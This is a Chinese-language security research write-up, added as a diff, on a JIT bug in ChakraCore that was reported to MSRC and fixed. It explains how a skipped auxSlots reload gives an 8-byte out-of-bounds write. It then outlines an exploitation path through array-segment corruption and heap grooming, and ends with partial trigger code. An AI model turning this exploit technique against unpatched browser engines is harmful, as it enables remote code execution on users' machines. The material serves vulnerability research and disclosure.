@@ -1,0 +1,202 @@
+本文介绍了`ChakraCore`中的一个漏洞，而此漏洞将导致RCE的产生。由于`Chakra`很长一段时间没有获得更新，所以我们从来没有报告过相关的文章因此这个bug从未作为Edge发布。我将此问题向MSRC进行报告，并受到了一封感谢信。最近该漏洞得的了修复，本文就此漏洞进行了研究。
+### 漏洞条件
+#### ChakraCore中的JSObjects
+在`ChakraCore`中，与其他引擎一样，对象的“默认”存储模式使用指向保存属性值的连续内存缓冲区的指针，并使用名为Type的对象来描述存储给定属性名称的属性值的位置。
+因此，JSObject的布局如下：
+  * vfptr：虚拟表指针
+  * type：保存Type指针
+  * auxSlots：指向缓冲区保持对象属性的指针
+  * objectArray：如果对象具有索引属性，则指向JSArray
+为了避免在将新属性添加到对象时重新分配和复制先前的属性，`auxSlots`缓冲区会以特定大小增长，以考虑将来的属性添加。
+#### ChakraCore中的JSArrays
+这里使用3种存储方式来存储数组以进行优化：
+`NativeIntArray`，其中整数以4个字节的形式存储
+`NativeFloatArray`，其中数字以8个字节的形式存储
+`JavascritpArray`将数字存储在其盒装表示中，并直接存储对象指针
+#### JIT背景知识
+`ChakraCore`有一个`JIT`编译器，它有两层优化：
+  * SimpleJit
+  * FullJit  
+FullJit层是执行所有优化的层，并使用直接算法优于正在优化的函数的控制流图（CFG）：
+  * 向后传递图表
+  * 向前传递
+  * 另一个向后传递（称为DeadStore传递）
+在这些过程中，在每个基本块处收集数据以跟踪关于使用表示JS变量的各种符号的各种信息，但也可以表示内部字段和指针。
+跟踪的一条信息是向上暴露的符号使用，这基本上允许知道给定的符号是否可以在以后使用并采取其他动作。
+### 漏洞详情
+该错误是在2018年9月的提交`8c5332b8eb5663e4ec2636d81175ccf7a0820ff2`中被引入的。
+如果我们查看提交，我们会看到它始终尝试优化一个名为`AdjustObjType`的指令，并引入了一个名为`AdjustObjTypeReloadAuxSlotPtr`的新指令。
+我们考虑以下代码段：
+    function opt(obj) {
+        ...
+        // assume obj->auxSlots is full at this stage
+        obj.new_property = 1; // [[ 1 ]]
+        ...
+    }
+JIT必须在[[1]]处生成`AdjustObjType`指令，以便正确地增长后备缓冲区。
+这个优化试图做的是基本上使用向上暴露的使用信息来决定它是否应该生成一个`AdjustObjType`或`AdjustObjTypeReloadAuxSlotPtr`，理由是如果该对象上没有更多的属性访问权限，我们就不必重新加载`auxSlots`指针。
+我们可以在下面的方法中看到后向传递中的特定逻辑。
+    void
+    BackwardPass::InsertTypeTransition(IR::Instr *instrInsertBefore, StackSym *objSym, AddPropertyCacheBucket *data, BVSparse* upwardExposedUses)
+    {
+        Assert(!this->IsPrePass());
+        IR::RegOpnd *baseOpnd = IR::RegOpnd::New(objSym, TyMachReg, this->func);
+        baseOpnd->SetIsJITOptimizedReg(true);
+        JITTypeHolder initialType = data->GetInitialType();
+        IR::AddrOpnd *initialTypeOpnd =
+            IR::AddrOpnd::New(data->GetInitialType()->GetAddr(), IR::AddrOpndKindDynamicType, this->func);
+        initialTypeOpnd->m_metadata = initialType.t;
+        JITTypeHolder finalType = data->GetFinalType();
+        IR::AddrOpnd *finalTypeOpnd =
+            IR::AddrOpnd::New(data->GetFinalType()->GetAddr(), IR::AddrOpndKindDynamicType, this->func);
+        finalTypeOpnd->m_metadata = finalType.t;
+        IR::Instr *adjustTypeInstr =            // [[ 1 ]]
+            IR::Instr::New(Js::OpCode::AdjustObjType, finalTypeOpnd, baseOpnd, initialTypeOpnd, this->func); 
+        if (upwardExposedUses)
+        {
+            // If this type change causes a slot adjustment, the aux slot pointer (if any) will be reloaded here, so take it out of upwardExposedUses.
+            int oldCount;
+            int newCount;
+            Js::PropertyIndex inlineSlotCapacity;
+            Js::PropertyIndex newInlineSlotCapacity;
+            bool needSlotAdjustment =
+                JITTypeHandler::NeedSlotAdjustment(initialType->GetTypeHandler(), finalType->GetTypeHandler(), &oldCount, &newCount, &inlineSlotCapacity, &newInlineSlotCapacity);
+            if (needSlotAdjustment)
+            {
+                StackSym *auxSlotPtrSym = baseOpnd->m_sym->GetAuxSlotPtrSym();
+                if (auxSlotPtrSym)
+                {
+                    if (upwardExposedUses->Test(auxSlotPtrSym->m_id))
+                    {
+                        adjustTypeInstr->m_opcode =                 // [[ 2 ]]
+                        Js::OpCode::AdjustObjTypeReloadAuxSlotPtr;
+                    }
+                }
+            }
+        }
+        instrInsertBefore->InsertBefore(adjustTypeInstr);
+    }
+我们可以看到默认情况下，在[[1]]处，如果测试`upwardExposedUses->
+Test`（`auxSlotPtrSym->m_id`）成功，它将生成一个`AdjustObjType`指令并仅将该指令类型更改为其变量`AdjustObjTypeReloadAuxSlotPtr`。
+然后我们可以看到在Lowerer中生成的逻辑处理这些特定指令。
+    void
+    Lowerer::LowerAdjustObjType(IR::Instr * instrAdjustObjType)
+    {
+        IR::AddrOpnd *finalTypeOpnd = instrAdjustObjType->UnlinkDst()->AsAddrOpnd();
+        IR::AddrOpnd *initialTypeOpnd = instrAdjustObjType->UnlinkSrc2()->AsAddrOpnd();
+        IR::RegOpnd  *baseOpnd = instrAdjustObjType->UnlinkSrc1()->AsRegOpnd();
+        bool adjusted = this->GenerateAdjustBaseSlots(
+            instrAdjustObjType, baseOpnd, JITTypeHolder((JITType*)initialTypeOpnd->m_metadata), JITTypeHolder((JITType*)finalTypeOpnd->m_metadata));
+        if (instrAdjustObjType->m_opcode == Js::OpCode::AdjustObjTypeReloadAuxSlotPtr)
+        {
+            Assert(adjusted);
+            // We reallocated the aux slots, so reload them if necessary.
+            StackSym * auxSlotPtrSym = baseOpnd->m_sym->GetAuxSlotPtrSym();
+            Assert(auxSlotPtrSym);
+            IR::Opnd *opndIndir = IR::IndirOpnd::New(baseOpnd, Js::DynamicObject::GetOffsetOfAuxSlots(), TyMachReg, this->m_func);
+            IR::RegOpnd *regOpnd = IR::RegOpnd::New(auxSlotPtrSym, TyMachReg, this->m_func);
+            regOpnd->SetIsJITOptimizedReg(true);
+            Lowerer::InsertMove(regOpnd, opndIndir, instrAdjustObjType);
+        }
+        this->m_func->PinTypeRef((JITType*)finalTypeOpnd->m_metadata);
+        IR::Opnd *opnd = IR::IndirOpnd::New(baseOpnd, Js::RecyclableObject::GetOffsetOfType(), TyMachReg, instrAdjustObjType->m_func);
+        this->InsertMove(opnd, finalTypeOpnd, instrAdjustObjType);
+        initialTypeOpnd->Free(instrAdjustObjType->m_func);
+        instrAdjustObjType->Remove();
+    }
+我们可以看到，如果`instrAdjustObjType->m_opcode ==
+Js::OpCode::AdjustObjTypeReloadAuxSlotPtr`，将添加额外的逻辑以重新加载auxSlots指针。
+那么问题是，优化实际上并不能正常工作，并且会导致错误。
+再次考虑一下片段。
+    function opt(obj) {
+        ...
+        // assume obj->auxSlots is full at this stage
+        obj.new_property = 1; // [[ 1 ]]
+    }
+这次我们没有任何代码通过属性存储将导致使用`auxSlots`，这意味着`obj`的`auxSlots`指针不会被设置为暴露，因此优化将发生生成`AdjustObjType`指令。
+一个小问题是，确实会重新加载`auxSlots`指针，所以如果我们看一下接下来发生的事情，我们可以发现以下逻辑。
+  * auxSlots指针是“实时”并加载到寄存器中
+  * 在写入新属性之前执行AdjustObjType
+  * auxSlots指针未重新加载
+  * 使用先前的auxSlots指针写入属性中
+因此，我们最终在原始的`auxSlots`缓冲区之后进行了8字节的OOB写操作，经过一些工作证明足以实现高度可靠的R/W原语。
+要触发此错误，我们可以使用以下`JavaScript`函数：
+    function opt(obj) {
+        obj.new_property = obj.some_existing_property;
+    }
+### 攻击步骤
+#### 建立目标
+在研究这个bug时，我发现应该考虑的中间步骤。
+我的目标是实现两个的原语：
+  * addrof将允许我们泄漏JavaScript对象的内部地址
+  * fakeobj whill将允许我们在内存中的任意地址处获取JavaScript对象的句柄
+#### 限制点
+我们设置了几个限制，我们必须考虑我们目前对这种情况的了解。
+首先，我们不控制写OOB的偏移量。 它将始终是auxSlots缓冲区之后的第一个QWORD。
+其次，我们不能写任意值，因为我们将分配一个`JSValue`。
+在`Chakra`中，这意味着如果我们分配整数`0x4141`它将写入`0x1000000004141`，双精度将类似地用`0xfffc<<48`标记，任何其他值将意味着写入指针`OOB`。
+### 找到易于覆盖的目标
+我们需要考虑一个合适的目标来进行覆盖操作。`Chakra`广泛使用虚拟方法，即大多数对象实际上将虚拟表指针作为其第一个`qword`。
+没有`infoleak`但`Control-Flow Guard`却存在是无法执行成功的。
+为了将这个8字节的`OOB`转换为一个更有效的原语语句，我最终定位了数组段。
+为了处理数组，`Chakra`使用基于段的实现来避内存扩张的问题。
+    let arr = [];
+    arr[0] = 0;
+    arr[0xfff] = 1;
+在上面的代码片段中，为了避免仅分配`0x1000 * 4`个字节来存储两个值，Chakra将此数组表示为具有两个段的数组：
+  * 第一个段开始索引0，其中包含指向的值0
+  * 第二个段，表示索引0xfff，包含值1
+内存中的分配有如下情况：
+  * uint32_t left：段的最左侧索引
+  * uint32_t length：该段中设置的最高索引
+  * uint32_t size：段可以存储的元素数量的实际大小
+  * segment * next：指向下一个段的指针  
+段的元素将在之后内联存储。
+正如我们所看到的，段的第一个`QWORD`有效地保存了两个字段来进行覆盖。更重要的是，我们可以使用标记的整数，并实际使用标记。如果我们写0x4000
+OOB，我们将得到一个段，其中`left == 0x4000`和`length == 0x10000`，其允许我们以更自由的方式读取段的OOB。
+现在我们需要处理如何在`auxSlots`缓冲区之后放置一个段，以便可以覆盖段的前8个字节。
+### Chakra Heap Feng-Shui
+`Chakra`中的大多数对象都是通过`Recycler`来分配的，它允许垃圾收集器完成它的工作。
+它是一个基于块的分配器，其中存储器的范围被保留并用于特定大小的块。对我们来最终在同一个块中的大小的对象很可能彼此相邻放置，而如果它们最终不在同一个块中，那么实现两个分配将是非常困难。
+值得庆幸的是，我们可以控制我们的`auxSlots`分配到哪个存储桶，因为我们可以在传递之前控制对象上设置的属性数。我只是很快就尝试向对象添加随机数量的属性，直到我知道哪个数字是正确的：
+  * auxSlots与新数组段分配在同一个存储内存中
+  * auxSlots已满
+如果我们有一个具有20个属性的对象，我们将满足这两个条件。
+### 破坏分区
+覆盖数组段的另一个好处是我们将能够通过常规`JavaScript`检测是否发生了损坏。我使用了以下策略：
+1 创建一个`NativeFloatArray`  
+2 设置一个索引（0x7000）：这有两个目的，首先关闭它将在数组上设置长度变量，以避免引擎在我们访问OOB索引并创建新段信息  
+3 用20个属性创建我们的对象：这将在正确的内存中分配我们的auxSlots  
+4 通过分配索引0x1000创建一个新段  
+通过在步骤3之后立即执行步骤4，我们尝试在步骤3中分配的对象的auxSlots之后增加索引0x1000的新段的可能性。
+然后我们使用触发器将`0x4000`写入边界。如果我们覆盖成功，我们会将段的索引更改为`0x4000`，因此如果我们读取该索引处的标记值，我们就会知道它是否有效。
+我们可以使用以下代码演示数组段的损坏：
+    // this creates an object of a certain size which makes so that its auxSlots is full
+    // adding a property to it will require growing the auxSlots buffer
+    function make_obj() {
+        let o = {};
+        o.a1=0x4000;
+        o.a2=0x4000;
+        o.a3=0x4000;
+        o.a4=0x4000;
+        o.a5=0x4000;
+        o.a6=0x4000;
+        o.a7=0x4000;
+        o.a8=0x4000;
+        o.a9=0x4000;
+        o.a10=0x4000;
+        o.a11=0x4000;
+        o.a12=0x4000;
+        o.a13=0x4000;
+        o.a14=0x4000;
+        o.a15=0x4000;
+        o.a16=0x4000;
+        o.a17=0x4000;
+        o.a18=0x4000;
+        o.a19=0x4000;
+        o.a20=0x4000;
+        return o;
+    }
+    function opt(o) {
+        o.pwn = o.a1;
+    }
